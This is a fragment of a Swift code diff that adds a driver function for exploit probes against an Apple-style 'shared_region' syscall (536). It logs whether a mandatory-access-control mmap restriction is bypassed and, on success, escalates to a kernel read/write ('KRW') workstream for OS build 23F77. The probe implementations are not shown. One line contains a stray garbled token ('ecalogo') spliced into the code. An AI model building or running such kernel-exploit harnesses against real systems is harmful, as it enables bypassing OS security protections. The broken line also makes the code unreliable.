+    func runP022Probes() {
+        guard p022Status != .running else { return }
+        p022Status = .running
+        p022ProbeResults.removeAll()
+        log("P022", "shared_region syscall 536 — probes A/B/C")
+
+        let a = P022Probes.probeA()
+        p022ProbeResults.append(a)
+        log(a.succeeded ? "+" : "-",
+            "P022 A (\(a.detail)): ret=\(a.ret) errno=\(a.errnoValue)")
+        if a.succeeded {
+            logSuccess("P022 Probe A ret=0 — MAC mmap BYPASSED — direct KRW path live")
+        }
+
+        let b = P022Probes.probeB()
+        p022ProbeResults.append(b)
+        log(b.ret != 0 ? "*" : "!",
+            "P022 B (\(b.detail)): ret=\(b.ret) errno=\(b.errnoValue) (nonzero expected)")
+
+        for c in P022Probes.probeC() {
+            p022ProbeResults.append(c)
+            log(c.succeeded ? "+" : "-",
+                "P022 C (\(c.detail)): ret=\(c.ret) errno=\(c.errnoValue)")
+        }
+
+        let anySuccess = p022ProbeResults.contains { $0.succeeded }
+        if anySuccess {
+            p022Status = .ok
+ecalogo            logSuccess("P022: bypass confirmed — elevate to KRW workstream")
+        } else {
+            p022Status = .fail(errno: p022ProbeResults.first?.errnoValue ?? 0, kr: 0)
+            logError("P022: all probes errno — sf_fd=-1 appears walled on 23F77")
         }
     }
 }
